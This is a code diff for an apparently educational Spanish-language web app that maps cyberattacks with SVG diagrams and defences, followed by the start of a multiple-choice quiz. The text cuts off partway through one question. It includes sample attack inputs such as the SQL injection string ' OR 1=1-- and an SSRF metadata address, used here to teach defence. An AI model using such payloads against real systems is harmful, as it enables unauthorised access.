+                    osc.frequency.exponentialRampToValueAtTime(880, now + 0.14);
+                    gain.gain.setValueAtTime(0.12, now);
+                    gain.gain.linearRampToValueAtTime(0.01, now + 0.16);
+                    osc.start(now);
+                    osc.stop(now + 0.16);
+                } else if (type === 'miss') {
+                    osc.type = 'sawtooth';
+                    osc.frequency.setValueAtTime(220, now);
+                    osc.frequency.linearRampToValueAtTime(130, now + 0.22);
+                    gain.gain.setValueAtTime(0.14, now);
+                    gain.gain.linearRampToValueAtTime(0.01, now + 0.24);
+                    osc.start(now);
+                    osc.stop(now + 0.24);
+                }
+            } catch (e) {
+                // Ignorar si el navegador bloquea el audio antes del primer toque
+            }
+        }
+
+        /* =====================================================================
+           2. UTILIDAD DE BARAJADO ALEATORIO SIN REPETICIÓN (ALGORITMO FISHER-YATES)
+           ===================================================================== */
+        /**
+         * Devuelve una copia mezclada aleatoriamente de cualquier array.
+         * Garantiza que las preguntas, los casos y las opciones salgan sin repetirse.
+         */
+        function shuffleArray(array) {
+            const copy = [...array];
+            for (let i = copy.length - 1; i > 0; i--) {
+                const j = Math.floor(Math.random() * (i + 1));
+                [copy[i], copy[j]] = [copy[j], copy[i]];
+            }
+            return copy;
+        }
+
+        /* =====================================================================
+           3. BASE DE DATOS VISUAL DE LA PARTE 1 (MAPA DE ATAQUES CON ILUSTRACIONES SVG)
+           Incluye los 6 ataques recomendados (2 Redes, 2 SO, 2 Servicios) para la UNIR
+           más otros 10 ataques fundamentales del temario (Phishing, Spear, Whaling, etc.).
+           ===================================================================== */
+        const VISUAL_ATTACKS = [
+            // ================= CATEGORÍA 1: REDES (4 ATAQUES) =================
+            {
+                id: 'arp-spoofing',
+                title: 'ARP Spoofing / Man-in-the-Middle',
+                category: 'REDES',
+                catLabel: '🌐 Redes',
+                unirPick: true, // Seleccionado como 1 de los 2 de Redes para el trabajo UNIR
+                shortDesc: 'El atacante envía respuestas ARP falsas en la red local (LAN) para asociar su MAC con la IP del router y espiar o modificar todo el tráfico.',
+                typeTag: 'Activo / Cracker',
+                ciaBroken: 'Confidencialidad e Integridad',
+                shield: 'Dynamic ARP Inspection (DAI) en switches + cifrado TLS/SSH.',
+                svg: `<svg viewBox="0 0 260 100">
+                    <rect x="10" y="15" width="60" height="32" rx="6" fill="#0f172a" stroke="#38bdf8" stroke-width="2"/>
+                    <text x="40" y="35" fill="#f8fafc" font-size="10" text-anchor="middle" font-weight="bold">Víctima</text>
+                    <rect x="190" y="15" width="60" height="32" rx="6" fill="#0f172a" stroke="#38bdf8" stroke-width="2"/>
+                    <text x="220" y="35" fill="#f8fafc" font-size="10" text-anchor="middle" font-weight="bold">Router</text>
+                    <rect x="95" y="58" width="70" height="34" rx="6" fill="#3b0a14" stroke="#ff3b5c" stroke-width="2"/>
+                    <text x="130" y="79" fill="#fecdd3" font-size="10" text-anchor="middle" font-weight="bold">😈 MITM ARP</text>
+                    <path d="M 70 30 L 105 58" stroke="#ff3b5c" stroke-width="2" stroke-dasharray="4"/>
+                    <path d="M 155 58 L 190 30" stroke="#ff3b5c" stroke-width="2" stroke-dasharray="4"/>
+                    <text x="130" y="22" fill="#94a3b8" font-size="9" text-anchor="middle">"Yo soy la IP del Router"</text>
+                </svg>`
+            },
+            {
+                id: 'ddos-syn',
+                title: 'DDoS SYN Flood (Inundación TCP)',
+                category: 'REDES',
+                catLabel: '🌐 Redes',
+                unirPick: true, // Seleccionado como 2 de los 2 de Redes para el trabajo UNIR
+                shortDesc: 'Una botnet envía miles de paquetes TCP SYN con IPs falsas sin completar el ACK final, agotando la tabla de conexiones del servidor.',
+                typeTag: 'Activo / Botnet',
+                ciaBroken: 'Disponibilidad',
+                shield: 'SYN Cookies en el firewall, Rate Limiting y mitigación Anti-DDoS.',
+                svg: `<svg viewBox="0 0 260 100">
+                    <rect x="12" y="10" width="52" height="22" rx="4" fill="#3b0a14" stroke="#ff3b5c" stroke-width="1.5"/>
+                    <text x="38" y="25" fill="#fecdd3" font-size="9" text-anchor="middle">Bot 1 SYN</text>
+                    <rect x="12" y="39" width="52" height="22" rx="4" fill="#3b0a14" stroke="#ff3b5c" stroke-width="1.5"/>
+                    <text x="38" y="54" fill="#fecdd3" font-size="9" text-anchor="middle">Bot 2 SYN</text>
+                    <rect x="12" y="68" width="52" height="22" rx="4" fill="#3b0a14" stroke="#ff3b5c" stroke-width="1.5"/>
+                    <text x="38" y="83" fill="#fecdd3" font-size="9" text-anchor="middle">Bot 3 SYN</text>
+                    <path d="M 68 21 L 165 45 M 68 50 L 165 50 M 68 79 L 165 55" stroke="#ff3b5c" stroke-width="2"/>
+                    <rect x="170" y="24" width="76" height="52" rx="8" fill="#1e293b" stroke="#f59e0b" stroke-width="2"/>
+                    <text x="208" y="46" fill="#fbbf24" font-size="10" text-anchor="middle" font-weight="bold">🔥 Servidor</text>
+                    <text x="208" y="62" fill="#f8fafc" font-size="8" text-anchor="middle">Backlog 100%</text>
+                </svg>`
+            },
+            {
+                id: 'dns-poisoning',
+                title: 'DNS Cache Poisoning (Spoofing)',
+                category: 'REDES',
+                catLabel: '🌐 Redes',
+                unirPick: false,
+                shortDesc: 'Corrompe la memoria caché de un servidor DNS introduciendo una IP falsa para que los usuarios entren a un servidor clonado sin notarlo.',
+                typeTag: 'Activo / Red',
+                ciaBroken: 'Integridad y Autenticación',
+                shield: 'Implementar firmas criptográficas DNSSEC y puertos efímeros aleatorios.',
+                svg: `<svg viewBox="0 0 260 100">
+                    <rect x="15" y="30" width="68" height="40" rx="6" fill="#0f172a" stroke="#38bdf8" stroke-width="2"/>
+                    <text x="49" y="48" fill="#38bdf8" font-size="9" text-anchor="middle" font-weight="bold">Resolver DNS</text>
+                    <text x="49" y="61" fill="#f8fafc" font-size="8" text-anchor="middle">Caché Envenenada</text>
+                    <path d="M 85 50 L 165 25" stroke="#22c55e" stroke-width="1.5" stroke-dasharray="3"/>
+                    <path d="M 85 50 L 165 72" stroke="#ff3b5c" stroke-width="2.5"/>
+                    <rect x="170" y="10" width="75" height="28" rx="5" fill="#0f172a" stroke="#22c55e" stroke-width="1.5"/>
+                    <text x="207" y="28" fill="#86efac" font-size="9" text-anchor="middle">Web Real</text>
+                    <rect x="170" y="56" width="75" height="32" rx="5" fill="#3b0a14" stroke="#ff3b5c" stroke-width="2"/>
+                    <text x="207" y="75" fill="#fecdd3" font-size="9" text-anchor="middle" font-weight="bold">IP Falsa 😈</text>
+                </svg>`
+            },
+            {
+                id: 'packet-sniffing',
+                title: 'Packet Sniffing Pasivo (Wiretapping)',
+                category: 'REDES',
+                catLabel: '🌐 Redes',
+                unirPick: false,
+                shortDesc: 'La tarjeta de red se pone en modo promiscuo para capturar silenciosamente tramas en claro (FTP, Telnet, HTTP) sin alterar los paquetes.',
+                typeTag: 'Pasivo / Espionaje',
+                ciaBroken: 'Confidencialidad',
+                shield: 'Cifrado de extremo a extremo (TLS 1.3, IPSec, SSH, WPA3) y segmentación VLAN.',
+                svg: `<svg viewBox="0 0 260 100">
+                    <line x1="20" y1="35" x2="240" y2="35" stroke="#38bdf8" stroke-width="3"/>
+                    <circle cx="80" cy="35" r="5" fill="#f8fafc"/>
+                    <circle cx="140" cy="35" r="5" fill="#f8fafc"/>
+                    <circle cx="190" cy="35" r="5" fill="#f8fafc"/>
+                    <path d="M 130 38 L 130 62" stroke="#fbbf24" stroke-width="2" stroke-dasharray="3"/>
+                    <rect x="75" y="62" width="110" height="28" rx="6" fill="#1e293b" stroke="#fbbf24" stroke-width="2"/>
+                    <text x="130" y="80" fill="#fde68a" font-size="9" text-anchor="middle" font-weight="bold">👁️ Sniffer Modo Promiscuo</text>
+                </svg>`
+            },
+
+            // ================= CATEGORÍA 2: SISTEMAS OPERATIVOS (4 ATAQUES) =================
+            {
+                id: 'buffer-overflow',
+                title: 'Buffer Overflow (Desbordamiento de Pila)',
+                category: 'SO',
+                catLabel: '💻 Sist. Operativos',
+                unirPick: true, // Seleccionado como 1 de los 2 de Sistemas Operativos para UNIR
+                shortDesc: 'Se escriben más bytes de los que caben en un búfer de memoria RAM, sobrescribiendo la dirección de retorno (EIP/RIP) para ejecutar código como root/SYSTEM.',
+                typeTag: 'Activo / Memoria SO',
+                ciaBroken: 'Integridad y Autorización',
+                shield: 'ASLR (aleatorización de memoria), DEP/NX (pila no ejecutable) y Stack Canaries.',
+                svg: `<svg viewBox="0 0 260 100">
+                    <rect x="25" y="18" width="65" height="64" rx="4" fill="#0f172a" stroke="#a855f7" stroke-width="2"/>
+                    <text x="57" y="42" fill="#e9d5ff" font-size="9" text-anchor="middle">Buffer A</text>
+                    <text x="57" y="65" fill="#94a3b8" font-size="8" text-anchor="middle">64 Bytes</text>
+                    <rect x="95" y="18" width="65" height="64" rx="4" fill="#3b0a14" stroke="#ff3b5c" stroke-width="2"/>
+                    <text x="127" y="42" fill="#fecdd3" font-size="9" text-anchor="middle" font-weight="bold">Overflow!</text>
+                    <text x="127" y="65" fill="#fca5a5" font-size="8" text-anchor="middle">Pisa RetAddr</text>
+                    <rect x="165" y="18" width="70" height="64" rx="4" fill="#3b0a14" stroke="#fbbf24" stroke-width="2"/>
+                    <text x="200" y="45" fill="#fde68a" font-size="9" text-anchor="middle" font-weight="bold">⚡ Shellcode</text>
+                    <text x="200" y="64" fill="#f8fafc" font-size="8" text-anchor="middle">Ring 0 / Root</text>
+                </svg>`
+            },
+            {
+                id: 'kernel-rootkit',
+                title: 'Rootkit de Kernel / Bootkit UEFI (Ring 0)',
+                category: 'SO',
+                catLabel: '💻 Sist. Operativos',
+                unirPick: true, // Seleccionado como 2 de los 2 de Sistemas Operativos para UNIR
+                shortDesc: 'Se infiltra en el núcleo del Sistema Operativo (Ring 0) o en el arranque UEFI, interceptando llamadas al sistema (Syscalls) para ocultar procesos y archivos maliciosos.',
+                typeTag: 'Activo / Persistencia SO',
+                ciaBroken: 'Integridad y Confidencialidad',
+                shield: 'UEFI Secure Boot con TPM, firma obligatoria de drivers del Kernel y EDR.',
+                svg: `<svg viewBox="0 0 260 100">
+                    <rect x="30" y="12" width="200" height="32" rx="6" fill="#0f172a" stroke="#38bdf8" stroke-width="1.5"/>
+                    <text x="130" y="32" fill="#bae6fd" font-size="10" text-anchor="middle">Ring 3: Aplicaciones y Antivirus (Ciegos)</text>
+                    <rect x="30" y="54" width="200" height="36" rx="6" fill="#3b0a14" stroke="#a855f7" stroke-width="2"/>
+                    <text x="130" y="76" fill="#f3e8ff" font-size="10" text-anchor="middle" font-weight="bold">👻 Ring 0: Kernel + Rootkit Oculto</text>
+                </svg>`
+            },
+            {
+                id: 'pass-the-hash',
+                title: 'Volcado LSASS y Pass-the-Hash (SO)',
+                category: 'SO',
+                catLabel: '💻 Sist. Operativos',
+                unirPick: false,
+                shortDesc: 'Extrae hashes NTLM de la memoria del proceso LSASS.exe en Windows (ej. con Mimikatz) y se autentica en otros equipos sin necesitar descifrar la contraseña.',
+                typeTag: 'Activo / Credenciales SO',
+                ciaBroken: 'Autenticación y Autorización',
+                shield: 'Windows Credential Guard (VBS), RunAsPPL para proteger LSASS y deshabilitar NTLM.',
+                svg: `<svg viewBox="0 0 260 100">
+                    <rect x="15" y="25" width="72" height="50" rx="6" fill="#0f172a" stroke="#a855f7" stroke-width="2"/>
+                    <text x="51" y="47" fill="#e9d5ff" font-size="9" text-anchor="middle" font-weight="bold">LSASS.exe</text>
+                    <text x="51" y="62" fill="#94a3b8" font-size="8" text-anchor="middle">RAM Windows</text>
+                    <path d="M 90 50 L 165 50" stroke="#ff3b5c" stroke-width="2.5"/>
+                    <text x="127" y="42" fill="#fbbf24" font-size="8" text-anchor="middle">Hash NTLM</text>
+                    <rect x="170" y="25" width="75" height="50" rx="6" fill="#3b0a14" stroke="#ff3b5c" stroke-width="2"/>
+                    <text x="207" y="48" fill="#fecdd3" font-size="9" text-anchor="middle" font-weight="bold">Acceso Admin</text>
+                    <text x="207" y="62" fill="#fca5a5" font-size="8" text-anchor="middle">Sin clave en claro</text>
+                </svg>`
+            },
+            {
+                id: 'side-channel',
+                title: 'Canal Lateral de CPU (Spectre / Meltdown)',
+                category: 'SO',
+                catLabel: '💻 Sist. Operativos',
+                unirPick: false,
+                shortDesc: 'Abusa de la ejecución especulativa del procesador y mide tiempos de acceso a la caché L1/L3 para leer secretos del Kernel o de otras máquinas virtuales.',
+                typeTag: 'Pasivo-Activo / Microarquitectura',
+                ciaBroken: 'Confidencialidad y Aislamiento',
+                shield: 'Aislamiento de tablas de páginas del kernel (KPTI), microcódigo actualizado y tiempo constante.',
+                svg: `<svg viewBox="0 0 260 100">
+                    <rect x="20" y="20" width="90" height="60" rx="8" fill="#0f172a" stroke="#a855f7" stroke-width="2"/>
+                    <text x="65" y="45" fill="#e9d5ff" font-size="10" text-anchor="middle" font-weight="bold">CPU Caché L1</text>
+                    <text x="65" y="62" fill="#94a3b8" font-size="8" text-anchor="middle">Ejec. Especulativa</text>
+                    <path d="M 115 50 L 155 50" stroke="#fbbf24" stroke-width="2" stroke-dasharray="3"/>
+                    <rect x="160" y="20" width="85" height="60" rx="8" fill="#1e293b" stroke="#fbbf24" stroke-width="2"/>
+                    <text x="202" y="45" fill="#fde68a" font-size="9" text-anchor="middle" font-weight="bold">⏱️ Cronómetro</text>
+                    <text x="202" y="62" fill="#f8fafc" font-size="8" text-anchor="middle">Deduce Claves</text>
+                </svg>`
+            },
+
+            // ================= CATEGORÍA 3: SERVICIOS (WEB, BD, CORREO, AD) (4 ATAQUES) =================
+            {
+                id: 'sql-injection',
+                title: 'Inyección SQL (SQLi) en Bases de Datos',
+                category: 'SERVICIOS',
+                catLabel: '🗄️ Servicios (BD/Web)',
+                unirPick: true, // Seleccionado como 1 de los 2 de Servicios para UNIR
+                shortDesc: 'Inserta comandos SQL maliciosos (como \' OR 1=1--) en un formulario web no parametrizado para saltarse el login o volcar toda la base de datos.',
+                typeTag: 'Activo / Servicio BD',
+                ciaBroken: 'Confidencialidad, Integridad y Autenticación',
+                shield: 'Consultas parametrizadas (Prepared Statements), WAF y mínimo privilegio en BD.',
+                svg: `<svg viewBox="0 0 260 100">
+                    <rect x="15" y="28" width="95" height="44" rx="6" fill="#3b0a14" stroke="#ff3b5c" stroke-width="2"/>
+                    <text x="62" y="47" fill="#fecdd3" font-size="9" text-anchor="middle" font-weight="bold">' OR '1'='1' --</text>
+                    <text x="62" y="62" fill="#fca5a5" font-size="8" text-anchor="middle">Input Web sin filtro</text>
+                    <path d="M 115 50 L 160 50" stroke="#f59e0b" stroke-width="2.5"/>
+                    <ellipse cx="202" cy="30" rx="38" ry="12" fill="#0f172a" stroke="#f59e0b" stroke-width="2"/>
+                    <path d="M 164 30 L 164 70 A 38 12 0 0 0 240 70 L 240 30" fill="#0f172a" stroke="#f59e0b" stroke-width="2"/>
+                    <text x="202" y="58" fill="#fde68a" font-size="9" text-anchor="middle" font-weight="bold">🗄️ Base Datos</text>
+                </svg>`
+            },
+            {
+                id: 'xss-stored',
+                title: 'Cross-Site Scripting (XSS) en Servicio Web',
+                category: 'SERVICIOS',
+                catLabel: '🗄️ Servicios (Web)',
+                unirPick: false,
+                shortDesc: 'Inyecta código JavaScript malicioso en una web legítima para que se ejecute en el navegador de otros usuarios y robe sus cookies o tokens de sesión.',
+                typeTag: 'Activo / Servicio Web',
+                ciaBroken: 'Autenticación e Integridad',
+                shield: 'Escapado de salida HTML, cabecera Content-Security-Policy (CSP) y cookies HttpOnly.',
+                svg: `<svg viewBox="0 0 260 100">
+                    <rect x="15" y="24" width="100" height="52" rx="6" fill="#0f172a" stroke="#f59e0b" stroke-width="2"/>
+                    <text x="65" y="45" fill="#fde68a" font-size="9" text-anchor="middle" font-weight="bold">&lt;script&gt;mal&lt;/script&gt;</text>
+                    <text x="65" y="62" fill="#94a3b8" font-size="8" text-anchor="middle">Guardado en el Foro</text>
+                    <path d="M 120 50 L 160 50" stroke="#ff3b5c" stroke-width="2"/>
+                    <rect x="165" y="24" width="80" height="52" rx="6" fill="#3b0a14" stroke="#ff3b5c" stroke-width="2"/>
+                    <text x="205" y="45" fill="#fecdd3" font-size="9" text-anchor="middle" font-weight="bold">🍪 Roba Sesión</text>
+                    <text x="205" y="62" fill="#fca5a5" font-size="8" text-anchor="middle">Navegador Víctima</text>
+                </svg>`
+            },
+            {
+                id: 'ssrf-cloud',
+                title: 'SSRF (Server-Side Request Forgery)',
+                category: 'SERVICIOS',
+                catLabel: '🗄️ Servicios (API/Cloud)',
+                unirPick: false,
+                shortDesc: 'Engaña a un servidor web para que haga peticiones HTTP hacia su propia red interna privada o al endpoint de metadatos Cloud (169.254.169.254).',
+                typeTag: 'Activo / Servicio API',
+                ciaBroken: 'Autorización y Confidencialidad',
+                shield: 'Lista blanca de dominios salientes, bloquear IPs privadas RFC1918 e IMDSv2 con token.',
+                svg: `<svg viewBox="0 0 260 100">
+                    <rect x="15" y="26" width="65" height="48" rx="6" fill="#3b0a14" stroke="#ff3b5c" stroke-width="2"/>
+                    <text x="47" y="48" fill="#fecdd3" font-size="9" text-anchor="middle" font-weight="bold">Atacante</text>
+                    <text x="47" y="62" fill="#fca5a5" font-size="7" text-anchor="middle">url=169.254..</text>
+                    <path d="M 82 50 L 112 50" stroke="#f59e0b" stroke-width="2"/>
+                    <rect x="115" y="26" width="55" height="48" rx="6" fill="#0f172a" stroke="#f59e0b" stroke-width="2"/>
+                    <text x="142" y="52" fill="#fde68a" font-size="9" text-anchor="middle" font-weight="bold">API Web</text>
+                    <path d="M 172 50 L 196 50" stroke="#ff3b5c" stroke-width="2"/>
+                    <rect x="198" y="26" width="52" height="48" rx="6" fill="#0f172a" stroke="#38bdf8" stroke-width="2"/>
+                    <text x="224" y="48" fill="#bae6fd" font-size="8" text-anchor="middle" font-weight="bold">Red Interna</text>
+                    <text x="224" y="62" fill="#94a3b8" font-size="7" text-anchor="middle">Claves IAM</text>
+                </svg>`
+            },
+            {
+                id: 'kerberoasting',
+                title: 'Kerberoasting en Directorio Activo (AD)',
+                category: 'SERVICIOS',
+                catLabel: '🗄️ Servicios (Identidad)',
+                unirPick: false,
+                shortDesc: 'Cualquier usuario del dominio pide tickets TGS de cuentas de servicio (SPN) al KDC y fuerza la contraseña offline sin generar bloqueos en la red.',
+                typeTag: 'Activo / Servicio AD',
+                ciaBroken: 'Autenticación y Autorización',
+                shield: 'Cuentas de servicio gestionadas (gMSA) de 120 caracteres y cifrado AES-256 en Kerberos.',
+                svg: `<svg viewBox="0 0 260 100">
+                    <rect x="15" y="25" width="75" height="50" rx="6" fill="#0f172a" stroke="#f59e0b" stroke-width="2"/>
+                    <text x="52" y="47" fill="#fde68a" font-size="9" text-anchor="middle" font-weight="bold">KDC Active Dir</text>
+                    <text x="52" y="62" fill="#94a3b8" font-size="8" text-anchor="middle">Entrega Ticket TGS</text>
+                    <path d="M 94 50 L 155 50" stroke="#ff3b5c" stroke-width="2"/>
+                    <rect x="160" y="25" width="85" height="50" rx="6" fill="#3b0a14" stroke="#ff3b5c" stroke-width="2"/>
+                    <text x="202" y="47" fill="#fecdd3" font-size="9" text-anchor="middle" font-weight="bold">Crackeo Offline</text>
+                    <text x="202" y="62" fill="#fca5a5" font-size="8" text-anchor="middle">Fuerza bruta GPU</text>
+                </svg>`
+            },
+
+            // ================= CATEGORÍA 4: CORREO / PHISHING / WHALING / MALWARE (4 ATAQUES) =================
+            {
+                id: 'spear-whaling',
+                title: 'Spear Phishing y Whaling (Correo SMTP)',
+                category: 'SOCIAL',
+                catLabel: '🎣 Servicio Correo / Social',
+                unirPick: true, // Seleccionado como 2 de los 2 de Servicios (Correo) y mencionado en la guía UNIR
+                shortDesc: 'Ataque al servicio de correo: Spear Phishing apunta a un empleado concreto y Whaling a altos directivos (CEO/CFO) suplantando dominios para robar accesos o fondos.',
+                typeTag: 'Activo / Servicio Correo',
+                ciaBroken: 'Autenticación y Confidencialidad',
+                shield: 'Autenticación de correo SPF, DKIM y DMARC (p=reject), llaves MFA FIDO2 y concienciación.',
+                svg: `<svg viewBox="0 0 260 100">
+                    <rect x="15" y="22" width="80" height="56" rx="6" fill="#3b0a14" stroke="#ec4899" stroke-width="2"/>
+                    <text x="55" y="44" fill="#fbcfe8" font-size="9" text-anchor="middle" font-weight="bold">🎣 Correo Falso</text>
+                    <text x="55" y="60" fill="#f9a8d4" font-size="8" text-anchor="middle">Spoofing SMTP</text>
+                    <path d="M 100 50 L 155 50" stroke="#ec4899" stroke-width="2.5"/>
+                    <rect x="160" y="22" width="85" height="56" rx="6" fill="#0f172a" stroke="#fbbf24" stroke-width="2"/>
+                    <text x="202" y="44" fill="#fde68a" font-size="9" text-anchor="middle" font-weight="bold">🐋 CEO / Whaling</text>
+                    <text x="202" y="60" fill="#cbd5e1" font-size="8" text-anchor="middle">Objetivo Dirigido</text>
+                </svg>`
+            },
+            {
+                id: 'phishing-masivo',
+                title: 'Phishing Masivo y Clonación de Portal',
+                category: 'SOCIAL',
+                catLabel: '🎣 Servicio Correo / Web',
+                unirPick: false,
+                shortDesc: 'Envío masivo e indiscriminado de correos o SMS (Smishing) con urgencia falsa que llevan a un portal de login clonado (Evilginx) para capturar usuario, clave y token.',
+                typeTag: 'Activo / Ingeniería Social',
+                ciaBroken: 'Autenticación',
+                shield: 'Autenticación FIDO2/WebAuthn (resistente a proxies de phishing) y filtrado de correo.',
+                svg: `<svg viewBox="0 0 260 100">
+                    <rect x="15" y="25" width="70" height="50" rx="6" fill="#3b0a14" stroke="#ec4899" stroke-width="2"/>
+                    <text x="50" y="48" fill="#fbcfe8" font-size="9" text-anchor="middle" font-weight="bold">📧 10.000 Mails</text>
+                    <text x="50" y="62" fill="#f9a8d4" font-size="7" text-anchor="middle">Envío Masivo</text>
+                    <path d="M 88 50 L 152 50" stroke="#ec4899" stroke-width="2"/>
+                    <rect x="156" y="25" width="88" height="50" rx="6" fill="#0f172a" stroke="#ff3b5c" stroke-width="2"/>
+                    <text x="200" y="48" fill="#fecdd3" font-size="9" text-anchor="middle" font-weight="bold">🌐 Login Clonado</text>
+                    <text x="200" y="62" fill="#94a3b8" font-size="8" text-anchor="middle">Captura Credenciales</text>
+                </svg>`
+            },
+            {
+                id: 'ransomware',
+                title: 'Ransomware de Doble Extorsión (Malware)',
+                category: 'SOCIAL',
+                catLabel: '🦠 Programa Maligno',
+                unirPick: false,
+                shortDesc: 'Programa maligno que primero exfiltra datos confidenciales y después cifra todos los discos y recursos compartidos SMB (con AES+RSA), exigiendo rescate.',
+                typeTag: 'Activo / Malware Crítico',
+                ciaBroken: 'Disponibilidad y Confidencialidad',
+                shield: 'Copias de seguridad 3-2-1 inmutables/offline, EDR con bloqueo de VSSAdmin y segmentación SMB.',
+                svg: `<svg viewBox="0 0 260 100">
+                    <rect x="20" y="22" width="90" height="56" rx="8" fill="#3b0a14" stroke="#ff3b5c" stroke-width="2"/>
+                    <text x="65" y="46" fill="#fecdd3" font-size="10" text-anchor="middle" font-weight="bold">🔒 Cifrado AES</text>
+                    <text x="65" y="62" fill="#fca5a5" font-size="8" text-anchor="middle">Borra ShadowCopy</text>
+                    <path d="M 115 50 L 155 50" stroke="#fbbf24" stroke-width="2"/>
+                    <rect x="160" y="22" width="82" height="56" rx="8" fill="#0f172a" stroke="#fbbf24" stroke-width="2"/>
+                    <text x="201" y="46" fill="#fde68a" font-size="9" text-anchor="middle" font-weight="bold">📤 Exfiltración</text>
+                    <text x="201" y="62" fill="#cbd5e1" font-size="8" text-anchor="middle">Doble Extorsión</text>
+                </svg>`
+            },
+            {
+                id: 'trojan-rat',
+                title: 'Troyano de Acceso Remoto (RAT / C2)',
+                category: 'SOCIAL',
+                catLabel: '🦠 Programa Maligno',
+                unirPick: false,
+                shortDesc: 'Programa maligno oculto dentro de un instalador o adjunto aparentemente legítimo que abre un canal inverso cifrado hacia el servidor de Comando y Control (C2).',
+                typeTag: 'Activo / Malware',
+                ciaBroken: 'Confidencialidad, Integridad y Control',
+                shield: 'Application Whitelisting (AppLocker), inspección saliente DNS/TLS y sandboxing de adjuntos.',
+                svg: `<svg viewBox="0 0 260 100">
+                    <rect x="18" y="24" width="84" height="52" rx="6" fill="#0f172a" stroke="#ec4899" stroke-width="2"/>
+                    <text x="60" y="46" fill="#fbcfe8" font-size="9" text-anchor="middle" font-weight="bold">🎁 App Legítima</text>
+                    <text x="60" y="62" fill="#f9a8d4" font-size="8" text-anchor="middle">+ Payload Oculto</text>
+                    <path d="M 106 50 L 156 50" stroke="#ff3b5c" stroke-width="2" stroke-dasharray="4"/>
+                    <rect x="160" y="24" width="82" height="52" rx="6" fill="#3b0a14" stroke="#ff3b5c" stroke-width="2"/>
+                    <text x="201" y="46" fill="#fecdd3" font-size="9" text-anchor="middle" font-weight="bold">📡 Servidor C2</text>
+                    <text x="201" y="62" fill="#fca5a5" font-size="8" text-anchor="middle">Reverse Shell</text>
+                </svg>`
+            }
+        ];
+
+        /**
+         * Renderiza las tarjetas visuales del Mapa de Ciberataques según el filtro elegido.
+         */
+        function filterMap(categoryFilter) {
+            // Actualizar estado visual de las píldoras y nodos del diagrama
+            document.querySelectorAll('.filter-pill').forEach(p => p.classList.remove('active'));
+            const activePill = document.getElementById('pill-' + categoryFilter);
+            if (activePill) activePill.classList.add('active');
+
+            document.querySelectorAll('.arch-node').forEach(node => {
+                if (node.dataset.cat === categoryFilter) {
+                    node.classList.add('active-filter');
+                } else {
+                    node.classList.remove('active-filter');
+                }
+            });
+
+            // Filtrar lista de ataques
+            const filtered = VISUAL_ATTACKS.filter(item => {
+                if (categoryFilter === 'ALL') return true;
+                if (categoryFilter === 'UNIR6') return item.unirPick === true;
+                return item.category === categoryFilter;
+            });
+
+            // Pintar tarjetas visuales con SVG
+            const container = document.getElementById('attackGridContainer');
+            container.innerHTML = filtered.map(att => `
+                <article class="attack-card">
+                    <div class="attack-visual-box">
+                        <span class="badge-cat-tag cat-${att.category}">${att.catLabel}</span>
+                        ${att.unirPick ? '<span class="badge-unir-pick">⭐ TOP 6 UNIR</span>' : ''}
+                        ${att.svg}
+                    </div>
+                    <div class="attack-body">
+                        <h3 class="attack-title">${att.title}</h3>
+                        <p class="attack-short-desc">${att.shortDesc}</p>
+                        <div class="mini-facts">
+                            <div class="fact-chip">
+                                <strong>Vector / Tipo</strong>
+                                ${att.typeTag}
+                            </div>
+                            <div class="fact-chip">
+                                <strong>Rompe</strong>
+                                ${att.ciaBroken}
+                            </div>
+                        </div>
+                        <div class="shield-strip">
+                            <strong>🛡️ Defensa:</strong> ${att.shield}
+                        </div>
+                    </div>
+                </article>
+            `).join('');
+        }
+
+        /* =====================================================================
+           4. PARTE 2: JUEGO TEST DE PREGUNTAS Y RESPUESTAS (18 PREGUNTAS, 3 VIDAS)
+           ===================================================================== */
+        const QUIZ_QUESTIONS_BANK = [
+            {
+                cat: '🎣 Phishing / Spear / Whaling',
+                q: '¿Cuál es la diferencia arquitectónica y de objetivo entre Phishing, Spear Phishing y Whaling?',
+                options: [
+                    'Phishing es masivo e indiscriminado; Spear Phishing va dirigido a un perfil o empleado específico; y Whaling apunta específicamente a la alta dirección (CEO/CFO).',
+                    'Phishing ataca redes Wi-Fi, Spear Phishing ataca bases de datos SQL y Whaling solo afecta a servidores Linux.',
+                    'Whaling es un ataque pasivo de escucha de paquetes y Spear Phishing es un virus que cifra el sector de arranque.',
+                    'No existe diferencia en el objetivo, solo cambia el protocolo de red utilizado (TCP, UDP o ICMP).'
+                ],
+                correctIndex: 0,
+                explanation: 'El Phishing lanza el anzuelo de forma masiva, el Spear Phishing investiga a un objetivo concreto y el Whaling ("caza de ballenas") apunta a ejecutivos de alto nivel con acceso financiero o estratégico.'
+            },
+            {
+                cat: '🌐 Ataques a Redes',
+                q: 'En un ataque de ARP Spoofing dentro de una subred local Ethernet, ¿qué debilidad del protocolo ARP explota el atacante?',
+                options: [
+                    'ARP no tiene verificación de autenticidad (es stateless) y los equipos aceptan respuestas ARP Gratuitas aunque no las hayan solicitado.',
+                    'El protocolo ARP cifra las direcciones MAC con un algoritmo MD5 obsoleto fácil de colisionar.',
+                    'Los switches bloquean automáticamente el tráfico TCP pero reenvían paquetes ARP a través de Internet.',
+                    'El servidor DHCP comparte su clave privada RSA en cada paquete de difusión ARP.'
+                ],
+                correctIndex: 0,
+                explanation: 'ARP confía ciegamente en cualquier respuesta ARP recibida en la LAN. Se mitiga activando Dynamic ARP Inspection (DAI) apoyado en DHCP Snooping.'
+            },
+            {
+                cat: '💻 Sistemas Operativos',
+                q: '¿Qué combinación de defensas del Sistema Operativo impide que un desbordamiento de búfer (Buffer Overflow) ejecute código malicioso en la pila (Stack)?',
+                options: [
+                    'DEP/NX (marcar la pila como No Ejecutable), ASLR (aleatorizar las direcciones de memoria) y Stack Canaries.',
+                    'Instalar un certificado SSL en el servidor web y cambiar el puerto SSH del 22 al 2222.',
+                    'Habilitar el protocolo DNSSEC junto con registros SPF y DMARC en el servidor de correo.',
+                    'Desactivar la memoria caché L1 del procesador y formatear el disco en sistema FAT32.'
+                ],
+                correctIndex: 0,
+                explanation: 'DEP/NX impide ejecutar instrucciones en páginas de datos (la pila), ASLR impide predecir a qué dirección saltar y el Canary detecta si el búfer ha pisado la pila antes del RET.'
+            },
+            {
+                cat: '🗄️ Ataques a Servicios',
+                q: 'Un atacante introduce \' OR 1=1 -- en el campo de usuario de un portal web y logra entrar sin contraseña. ¿Por qué ocurre esta vulnerabilidad en el servicio?',
+                options: [
+                    'Porque el backend concatena directamente la cadena del usuario dentro de la sentencia SQL en lugar de usar consultas parametrizadas (Prepared Statements).',
+                    'Porque el firewall perimetral tiene abierto el puerto 443 con TLS 1.2 en vez de TLS 1.3.',
+                    'Porque la tabla ARP del switch perimetral ha sido envenenada mediante paquetes ICMP.',
